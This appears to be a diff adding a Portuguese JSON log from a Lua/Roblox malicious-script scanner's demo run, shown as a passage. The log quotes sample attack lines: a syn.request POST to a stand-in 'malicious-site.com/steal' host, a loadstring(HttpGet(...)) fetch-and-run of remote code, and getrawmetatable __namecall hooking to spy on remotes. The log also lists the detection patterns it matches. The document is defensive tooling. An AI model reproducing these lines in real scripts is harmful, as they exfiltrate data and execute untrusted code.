@@ -1,0 +1,2594 @@
+{
+  "entries": [
+    {
+      "category": "MAIN",
+      "data": {
+        "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+        "version": "3.0.0"
+      },
+      "id": 1,
+      "level": "INFO",
+      "message": "Scanning-Lua inicializado",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "min_severity": "LOW",
+        "patterns_count": 30
+      },
+      "id": 2,
+      "level": "INFO",
+      "message": "Módulo de filtros carregado",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "auto_scan": false,
+        "scan_interval": 30
+      },
+      "id": 3,
+      "level": "INFO",
+      "message": "Scanner inicializado",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 4,
+      "level": "INFO",
+      "message": "Detector de vulnerabilidades carregado",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 5,
+      "level": "INFO",
+      "message": "Monitor de rede inicializado",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "incremental_enabled": true,
+        "signatures_count": 20,
+        "stealth_enabled": false
+      },
+      "id": 6,
+      "level": "INFO",
+      "message": "Todos os módulos avançados carregados",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HOOK_DETECT",
+      "id": 7,
+      "level": "INFO",
+      "message": "Capturando baseline de funções originais",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HOOK_DETECT",
+      "id": 8,
+      "level": "INFO",
+      "message": "Baseline capturada: 20 funções monitoradas",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INTEGRITY",
+      "id": 9,
+      "level": "DEBUG",
+      "message": "Módulo registrado: scanner (0 funções protegidas)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INTEGRITY",
+      "id": 10,
+      "level": "DEBUG",
+      "message": "Módulo registrado: vulnDetector (0 funções protegidas)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INTEGRITY",
+      "id": 11,
+      "level": "DEBUG",
+      "message": "Módulo registrado: networkMonitor (0 funções protegidas)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "DEMO",
+      "id": 12,
+      "level": "INFO",
+      "message": "Iniciando demonstração do scanner avançado",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 13,
+      "level": "INFO",
+      "message": "Analisando código: sample_data_exfiltration.lua (305 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 14,
+      "level": "DEBUG",
+      "message": "Novo script: sample_data_exfiltration.lua (hash: 5d5b1a1f)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local HttpService = game:GetService(\"HttpService\")",
+        "line_number": 1,
+        "matched_text": "game:GetService(\"HttpService\")",
+        "pattern": "game:GetService%(\"HttpService\"%)",
+        "position": {
+          "finish": 58,
+          "start": 29
+        },
+        "severity": "LOW",
+        "source": "sample_data_exfiltration.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 15,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'game:GetService(\"HttpService\")' em sample_data_exfiltration.lua (linha 1) [LOW]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local response = syn.request({",
+        "line_number": 3,
+        "matched_text": "syn.request",
+        "pattern": "syn%.request",
+        "position": {
+          "finish": 181,
+          "start": 171
+        },
+        "severity": "HIGH",
+        "source": "sample_data_exfiltration.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 16,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'syn.request' em sample_data_exfiltration.lua (linha 3) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local response = syn.request({",
+        "line_number": 3,
+        "matched_text": "request",
+        "pattern": "request",
+        "position": {
+          "finish": 181,
+          "start": 175
+        },
+        "severity": "LOW",
+        "source": "sample_data_exfiltration.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 17,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'request' em sample_data_exfiltration.lua (linha 3) [LOW]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "DATA_EXFILTRATION",
+        "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local response = syn.request({",
+        "line_number": 3,
+        "matched_text": "syn.request",
+        "name": "Requisição HTTP para domínio externo",
+        "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+        "severity": "HIGH",
+        "source": "sample_data_exfiltration.lua",
+        "vuln_id": "VULN-DE-001"
+      },
+      "id": 18,
+      "level": "WARN",
+      "message": "[VULN-DE-001] Requisição HTTP para domínio externo em sample_data_exfiltration.lua (linha 3) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SIGNATURE",
+      "data": {
+        "category": "NETWORK_ABUSE",
+        "description": "Requisição POST via syn.request para servidor externo.",
+        "line_number": 3,
+        "matched_text": "syn.request({\n            Url = \"http://malicious-site.com/steal\",\n            Method = \"POST",
+        "severity": "HIGH",
+        "signature_id": "SIG-MP-001",
+        "signature_name": "Synapse Request to External",
+        "source": "sample_data_exfiltration.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 19,
+      "level": "WARN",
+      "message": "[SIG-MP-001] Synapse Request to External detectado em sample_data_exfiltration.lua (linha 3) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 1.0,
+        "color": "🟡",
+        "combos": {},
+        "context": {
+          "adjustment": 0,
+          "code_length": 305,
+          "factors": {},
+          "line_count": 8
+        },
+        "indicators": {
+          "syn.request": {
+            "count": 1,
+            "points": 6,
+            "weight": 6
+          }
+        },
+        "level": "LOW",
+        "score": 6,
+        "source": "sample_data_exfiltration.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 20,
+      "level": "INFO",
+      "message": "🟡 Score: 6 (LOW) para sample_data_exfiltration.lua [1 indicadores, 0 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 21,
+      "level": "INFO",
+      "message": "Filtrado: 0 alertas passaram, 1 suprimidos",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 305,
+        "deobfuscation": {
+          "transformations": {},
+          "was_obfuscated": false
+        },
+        "false_positive": {
+          "alerts_passed": 0,
+          "alerts_suppressed": 1
+        },
+        "filter_matches": [
+          {
+            "line_content": "local HttpService = game:GetService(\"HttpService\")",
+            "line_number": 1,
+            "matched_text": "game:GetService(\"HttpService\")",
+            "pattern": "game:GetService%(\"HttpService\"%)",
+            "position": {
+              "finish": 58,
+              "start": 29
+            },
+            "severity": "LOW",
+            "source": "sample_data_exfiltration.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "local response = syn.request({",
+            "line_number": 3,
+            "matched_text": "syn.request",
+            "pattern": "syn%.request",
+            "position": {
+              "finish": 181,
+              "start": 171
+            },
+            "severity": "HIGH",
+            "source": "sample_data_exfiltration.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "local response = syn.request({",
+            "line_number": 3,
+            "matched_text": "request",
+            "pattern": "request",
+            "position": {
+              "finish": 181,
+              "start": 175
+            },
+            "severity": "LOW",
+            "source": "sample_data_exfiltration.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          }
+        ],
+        "heuristic": {
+          "best_multiplier": 1.0,
+          "color": "🟡",
+          "combos": {},
+          "context": {
+            "adjustment": 0,
+            "code_length": 305,
+            "factors": {},
+            "line_count": 8
+          },
+          "indicators": {
+            "syn.request": {
+              "count": 1,
+              "points": 6,
+              "weight": 6
+            }
+          },
+          "level": "LOW",
+          "score": 6,
+          "source": "sample_data_exfiltration.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 0,
+          "patterns": {}
+        },
+        "match_count": 3,
+        "payloads": {
+          "count": 0,
+          "detections": {}
+        },
+        "signatures": {
+          "count": 1,
+          "detections": [
+            {
+              "category": "NETWORK_ABUSE",
+              "description": "Requisição POST via syn.request para servidor externo.",
+              "line_number": 3,
+              "matched_text": "syn.request({\n            Url = \"http://malicious-site.com/steal\",\n            Method = \"POST",
+              "severity": "HIGH",
+              "signature_id": "SIG-MP-001",
+              "signature_name": "Synapse Request to External",
+              "source": "sample_data_exfiltration.lua",
+              "timestamp": "2026-04-16T11:41:35Z"
+            }
+          ]
+        },
+        "source": "sample_data_exfiltration.lua",
+        "vulnerabilities": [
+          {
+            "category": "DATA_EXFILTRATION",
+            "description": "Requisições HTTP para domínios não-Roblox podem indicar exfiltração de dados.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "local response = syn.request({",
+            "line_number": 3,
+            "matched_text": "syn.request",
+            "name": "Requisição HTTP para domínio externo",
+            "remediation": "Bloquear requisições para domínios não autorizados. Usar whitelist de domínios.",
+            "severity": "HIGH",
+            "source": "sample_data_exfiltration.lua",
+            "vuln_id": "VULN-DE-001"
+          }
+        ],
+        "vulnerability_count": 1
+      },
+      "id": 22,
+      "level": "INFO",
+      "message": "Análise concluída: 3 padrões, 1 vulns, 1 assinaturas, score 6 (LOW)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 23,
+      "level": "INFO",
+      "message": "Analisando código: sample_metatable_hook.lua (421 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 24,
+      "level": "DEBUG",
+      "message": "Novo script: sample_metatable_hook.lua (hash: 33479da1)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local mt = getrawmetatable(game)",
+        "line_number": 1,
+        "matched_text": "getrawmetatable",
+        "pattern": "getrawmetatable",
+        "position": {
+          "finish": 34,
+          "start": 20
+        },
+        "severity": "CRITICAL",
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 25,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'getrawmetatable' em sample_metatable_hook.lua (linha 1) [CRITICAL]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "setrawmetatable(game, {",
+        "line_number": 3,
+        "matched_text": "setrawmetatable",
+        "pattern": "setrawmetatable",
+        "position": {
+          "finish": 106,
+          "start": 92
+        },
+        "severity": "CRITICAL",
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 26,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'setrawmetatable' em sample_metatable_hook.lua (linha 3) [CRITICAL]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "__namecall = newcclosure(function(self, ...)",
+        "line_number": 4,
+        "matched_text": "newcclosure",
+        "pattern": "newcclosure",
+        "position": {
+          "finish": 151,
+          "start": 141
+        },
+        "severity": "MEDIUM",
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 27,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'newcclosure' em sample_metatable_hook.lua (linha 4) [MEDIUM]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local method = getnamecallmethod()",
+        "line_number": 5,
+        "matched_text": "getnamecallmethod",
+        "pattern": "getnamecallmethod",
+        "position": {
+          "finish": 220,
+          "start": 204
+        },
+        "severity": "MEDIUM",
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 28,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'getnamecallmethod' em sample_metatable_hook.lua (linha 5) [MEDIUM]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "MEMORY_MANIPULATION",
+        "description": "Acesso e modificação de metatables pode alterar o comportamento fundamental de objetos do jogo.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local mt = getrawmetatable(game)",
+        "line_number": 1,
+        "matched_text": "getrawmetatable",
+        "name": "Manipulação de metatables",
+        "remediation": "Proteger metatables com __metatable. Monitorar acessos não autorizados.",
+        "severity": "CRITICAL",
+        "source": "sample_metatable_hook.lua",
+        "vuln_id": "VULN-MM-001"
+      },
+      "id": 29,
+      "level": "WARN",
+      "message": "[VULN-MM-001] Manipulação de metatables em sample_metatable_hook.lua (linha 1) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "MEMORY_MANIPULATION",
+        "description": "Acesso e modificação de metatables pode alterar o comportamento fundamental de objetos do jogo.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "setrawmetatable(game, {",
+        "line_number": 3,
+        "matched_text": "setrawmetatable",
+        "name": "Manipulação de metatables",
+        "remediation": "Proteger metatables com __metatable. Monitorar acessos não autorizados.",
+        "severity": "CRITICAL",
+        "source": "sample_metatable_hook.lua",
+        "vuln_id": "VULN-MM-001"
+      },
+      "id": 30,
+      "level": "WARN",
+      "message": "[VULN-MM-001] Manipulação de metatables em sample_metatable_hook.lua (linha 3) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "AUTHENTICATION_BYPASS",
+        "description": "Manipulação de namecall permite alterar o método chamado em objetos Roblox.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "local method = getnamecallmethod()",
+        "line_number": 5,
+        "matched_text": "getnamecallmethod",
+        "name": "Bypass de namecall",
+        "remediation": "Implementar verificações server-side independentes do método de chamada.",
+        "severity": "HIGH",
+        "source": "sample_metatable_hook.lua",
+        "vuln_id": "VULN-AB-001"
+      },
+      "id": 31,
+      "level": "WARN",
+      "message": "[VULN-AB-001] Bypass de namecall em sample_metatable_hook.lua (linha 5) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SIGNATURE",
+      "data": {
+        "category": "REMOTE_SPY",
+        "description": "Interceptação de remotes via hooking de __namecall.",
+        "line_number": 5,
+        "matched_text": "getnamecallmethod()\n                if method == \"FireServer",
+        "severity": "HIGH",
+        "signature_id": "SIG-RS-003",
+        "signature_name": "Remote Spy via Namecall",
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 32,
+      "level": "WARN",
+      "message": "[SIG-RS-003] Remote Spy via Namecall detectado em sample_metatable_hook.lua (linha 5) - HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "SIGNATURE",
+      "data": {
+        "category": "ENVIRONMENT_MANIPULATION",
+        "description": "Manipulação de metatable do game para interceptar chamadas.",
+        "line_number": 1,
+        "matched_text": "getrawmetatable(game)\n        local oldNamecall = mt.__namecall\n        setrawmetatable(game, {\n     ",
+        "severity": "CRITICAL",
+        "signature_id": "SIG-EM-001",
+        "signature_name": "Environment Hijack",
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 33,
+      "level": "WARN",
+      "message": "[SIG-EM-001] Environment Hijack detectado em sample_metatable_hook.lua (linha 1) - CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "HEURISTIC",
+      "data": {
+        "best_multiplier": 1.0,
+        "color": "🔴",
+        "combos": {},
+        "context": {
+          "adjustment": 0,
+          "code_length": 421,
+          "factors": {},
+          "line_count": 12
+        },
+        "indicators": {
+          "fireserver": {
+            "count": 1,
+            "points": 3,
+            "weight": 3
+          },
+          "getnamecallmethod": {
+            "count": 1,
+            "points": 4,
+            "weight": 4
+          },
+          "getrawmetatable": {
+            "count": 1,
+            "points": 7,
+            "weight": 7
+          },
+          "newcclosure": {
+            "count": 1,
+            "points": 5,
+            "weight": 5
+          },
+          "setrawmetatable": {
+            "count": 1,
+            "points": 7,
+            "weight": 7
+          }
+        },
+        "level": "HIGH",
+        "score": 26,
+        "source": "sample_metatable_hook.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 34,
+      "level": "INFO",
+      "message": "🔴 Score: 26 (HIGH) para sample_metatable_hook.lua [5 indicadores, 0 combos]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 35,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=sample_metatable_hook.lua, score=26→26, severity=CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 36,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=sample_metatable_hook.lua, score=26→26, severity=CRITICAL",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FP_REDUCER",
+      "id": 37,
+      "level": "DEBUG",
+      "message": "Alerta aprovado: source=sample_metatable_hook.lua, score=26→26, severity=HIGH",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "data": {
+        "behavior": {
+          "count": 0,
+          "detections": {}
+        },
+        "code_length": 421,
+        "deobfuscation": {
+          "transformations": {},
+          "was_obfuscated": false
+        },
+        "false_positive": {
+          "alerts_passed": 3,
+          "alerts_suppressed": 0
+        },
+        "filter_matches": [
+          {
+            "line_content": "local mt = getrawmetatable(game)",
+            "line_number": 1,
+            "matched_text": "getrawmetatable",
+            "pattern": "getrawmetatable",
+            "position": {
+              "finish": 34,
+              "start": 20
+            },
+            "severity": "CRITICAL",
+            "source": "sample_metatable_hook.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "setrawmetatable(game, {",
+            "line_number": 3,
+            "matched_text": "setrawmetatable",
+            "pattern": "setrawmetatable",
+            "position": {
+              "finish": 106,
+              "start": 92
+            },
+            "severity": "CRITICAL",
+            "source": "sample_metatable_hook.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "__namecall = newcclosure(function(self, ...)",
+            "line_number": 4,
+            "matched_text": "newcclosure",
+            "pattern": "newcclosure",
+            "position": {
+              "finish": 151,
+              "start": 141
+            },
+            "severity": "MEDIUM",
+            "source": "sample_metatable_hook.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          },
+          {
+            "line_content": "local method = getnamecallmethod()",
+            "line_number": 5,
+            "matched_text": "getnamecallmethod",
+            "pattern": "getnamecallmethod",
+            "position": {
+              "finish": 220,
+              "start": 204
+            },
+            "severity": "MEDIUM",
+            "source": "sample_metatable_hook.lua",
+            "timestamp": "2026-04-16T11:41:35Z"
+          }
+        ],
+        "heuristic": {
+          "best_multiplier": 1.0,
+          "color": "🔴",
+          "combos": {},
+          "context": {
+            "adjustment": 0,
+            "code_length": 421,
+            "factors": {},
+            "line_count": 12
+          },
+          "indicators": {
+            "fireserver": {
+              "count": 1,
+              "points": 3,
+              "weight": 3
+            },
+            "getnamecallmethod": {
+              "count": 1,
+              "points": 4,
+              "weight": 4
+            },
+            "getrawmetatable": {
+              "count": 1,
+              "points": 7,
+              "weight": 7
+            },
+            "newcclosure": {
+              "count": 1,
+              "points": 5,
+              "weight": 5
+            },
+            "setrawmetatable": {
+              "count": 1,
+              "points": 7,
+              "weight": 7
+            }
+          },
+          "level": "HIGH",
+          "score": 26,
+          "source": "sample_metatable_hook.lua",
+          "timestamp": "2026-04-16T11:41:35Z"
+        },
+        "hooks": {
+          "count": 3,
+          "patterns": [
+            {
+              "description": "Padrão de hooking 'getrawmetatable' encontrado em sample_metatable_hook.lua",
+              "pattern": "getrawmetatable",
+              "severity": "HIGH",
+              "source": "sample_metatable_hook.lua"
+            },
+            {
+              "description": "Padrão de hooking 'setrawmetatable' encontrado em sample_metatable_hook.lua",
+              "pattern": "setrawmetatable",
+              "severity": "HIGH",
+              "source": "sample_metatable_hook.lua"
+            },
+            {
+              "description": "Padrão de hooking '__namecall override' encontrado em sample_metatable_hook.lua",
+              "pattern": "__namecall override",
+              "severity": "CRITICAL",
+              "source": "sample_metatable_hook.lua"
+            }
+          ]
+        },
+        "match_count": 4,
+        "payloads": {
+          "count": 0,
+          "detections": {}
+        },
+        "signatures": {
+          "count": 2,
+          "detections": [
+            {
+              "category": "REMOTE_SPY",
+              "description": "Interceptação de remotes via hooking de __namecall.",
+              "line_number": 5,
+              "matched_text": "getnamecallmethod()\n                if method == \"FireServer",
+              "severity": "HIGH",
+              "signature_id": "SIG-RS-003",
+              "signature_name": "Remote Spy via Namecall",
+              "source": "sample_metatable_hook.lua",
+              "timestamp": "2026-04-16T11:41:35Z"
+            },
+            {
+              "category": "ENVIRONMENT_MANIPULATION",
+              "description": "Manipulação de metatable do game para interceptar chamadas.",
+              "line_number": 1,
+              "matched_text": "getrawmetatable(game)\n        local oldNamecall = mt.__namecall\n        setrawmetatable(game, {\n     ",
+              "severity": "CRITICAL",
+              "signature_id": "SIG-EM-001",
+              "signature_name": "Environment Hijack",
+              "source": "sample_metatable_hook.lua",
+              "timestamp": "2026-04-16T11:41:35Z"
+            }
+          ]
+        },
+        "source": "sample_metatable_hook.lua",
+        "vulnerabilities": [
+          {
+            "category": "MEMORY_MANIPULATION",
+            "description": "Acesso e modificação de metatables pode alterar o comportamento fundamental de objetos do jogo.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "local mt = getrawmetatable(game)",
+            "line_number": 1,
+            "matched_text": "getrawmetatable",
+            "name": "Manipulação de metatables",
+            "remediation": "Proteger metatables com __metatable. Monitorar acessos não autorizados.",
+            "severity": "CRITICAL",
+            "source": "sample_metatable_hook.lua",
+            "vuln_id": "VULN-MM-001"
+          },
+          {
+            "category": "MEMORY_MANIPULATION",
+            "description": "Acesso e modificação de metatables pode alterar o comportamento fundamental de objetos do jogo.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "setrawmetatable(game, {",
+            "line_number": 3,
+            "matched_text": "setrawmetatable",
+            "name": "Manipulação de metatables",
+            "remediation": "Proteger metatables com __metatable. Monitorar acessos não autorizados.",
+            "severity": "CRITICAL",
+            "source": "sample_metatable_hook.lua",
+            "vuln_id": "VULN-MM-001"
+          },
+          {
+            "category": "AUTHENTICATION_BYPASS",
+            "description": "Manipulação de namecall permite alterar o método chamado em objetos Roblox.",
+            "detection_time": "2026-04-16T11:41:35Z",
+            "line_content": "local method = getnamecallmethod()",
+            "line_number": 5,
+            "matched_text": "getnamecallmethod",
+            "name": "Bypass de namecall",
+            "remediation": "Implementar verificações server-side independentes do método de chamada.",
+            "severity": "HIGH",
+            "source": "sample_metatable_hook.lua",
+            "vuln_id": "VULN-AB-001"
+          }
+        ],
+        "vulnerability_count": 3
+      },
+      "id": 38,
+      "level": "INFO",
+      "message": "Análise concluída: 4 padrões, 3 vulns, 2 assinaturas, score 26 (HIGH)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "MAIN",
+      "id": 39,
+      "level": "INFO",
+      "message": "Analisando código: sample_code_injection.lua (162 caracteres)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "INCREMENTAL",
+      "id": 40,
+      "level": "DEBUG",
+      "message": "Novo script: sample_code_injection.lua (hash: 06116acf)",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+        "line_number": 1,
+        "matched_text": "loadstring",
+        "pattern": "loadstring",
+        "position": {
+          "finish": 18,
+          "start": 9
+        },
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 41,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'loadstring' em sample_code_injection.lua (linha 1) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+        "line_number": 1,
+        "matched_text": "HttpGet",
+        "pattern": "HttpGet",
+        "position": {
+          "finish": 31,
+          "start": 25
+        },
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 42,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'HttpGet' em sample_code_injection.lua (linha 1) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "FILTER",
+      "data": {
+        "line_content": "local env = getgenv()",
+        "line_number": 2,
+        "matched_text": "getgenv",
+        "pattern": "getgenv",
+        "position": {
+          "finish": 125,
+          "start": 119
+        },
+        "severity": "HIGH",
+        "source": "sample_code_injection.lua",
+        "timestamp": "2026-04-16T11:41:35Z"
+      },
+      "id": 43,
+      "level": "WARN",
+      "message": "Padrão suspeito encontrado: 'getgenv' em sample_code_injection.lua (linha 2) [HIGH]",
+      "session_id": "d6cce35c-487a-458f-bab2-9032c2621f38",
+      "timestamp": "2026-04-16T11:41:35Z"
+    },
+    {
+      "category": "VULN",
+      "data": {
+        "category": "CODE_INJECTION",
+        "description": "Uso de loadstring permite execução de código arbitrário e pode ser explorado para injeção de código malicioso.",
+        "detection_time": "2026-04-16T11:41:35Z",
+        "line_content": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/user/repo/main/script.lua\"))()",
+        "line_number": 1,
+        "matched_text": "loadstring",
+        "name": "Uso de loadstring",
+        "remediation": "Evitar uso de loadstring. Usar alternativas seguras como módulos pré-compilados.",
+        "severity": "CRITICAL",
+        "source": "sample_code_injection.lua",
+        "vuln_id": "VULN-CI-001"
+      },
+      "id": 44,
+      "level": "WARN",
